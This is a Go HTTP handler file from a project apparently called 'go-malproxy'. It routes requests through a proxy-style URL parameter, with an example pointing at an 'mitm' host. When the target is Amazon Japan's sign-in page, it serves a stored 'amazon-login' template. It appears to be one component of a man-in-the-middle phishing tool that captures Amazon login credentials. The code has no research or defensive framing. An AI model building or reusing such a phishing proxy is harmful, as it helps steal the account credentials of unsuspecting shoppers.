package handler

import (
	"context"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/go-malproxy/server/service"
)

type TemplateExecutor interface {
	ExecuteTemplate(wr io.Writer, name string, data interface{}) error
}

type DebugTemplateExecutor struct {
	Glob string
}

func (e DebugTemplateExecutor) ExecuteTemplate(wr io.Writer, name string, data interface{}) error {
	t := template.Must(template.ParseGlob(e.Glob))
	return t.ExecuteTemplate(wr, name, data)
}

type ReleaseTemplateExecutor struct {
	Template *template.Template
}

func (e ReleaseTemplateExecutor) ExecuteTemplate(wr io.Writer, name string, data interface{}) error {
	return e.Template.ExecuteTemplate(wr, name, data)
}

const TemplateGlob = "server/templates/*.html"
const Debug = true

var Executor TemplateExecutor
var ctx context.Context
var services service.Service = &service.Contents{&ctx}

func IndexHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/
	Executor.ExecuteTemplate(w, "index", nil)
}

func HelloHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/hello
	Executor.ExecuteTemplate(w, "hello", nil)
}

func TemplateHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/template?url=http://mitm.es3/amazon.co.jp
	fmt.Println("\x1b[31mURL:\x1b[0m", r.FormValue("url")) //取得したパラメータの表示
	url := r.FormValue("url")
	if strings.Contains(url, "https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age") {
		fmt.Println("Amazon Login")
		Executor.ExecuteTemplate(w, "amazon-login", nil)
	} else {
		fmt.Println("Main Operation")
		res, err := service.MainOperation(url)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("res:", res)
		Executor.ExecuteTemplate(w, res, nil)
	}
}
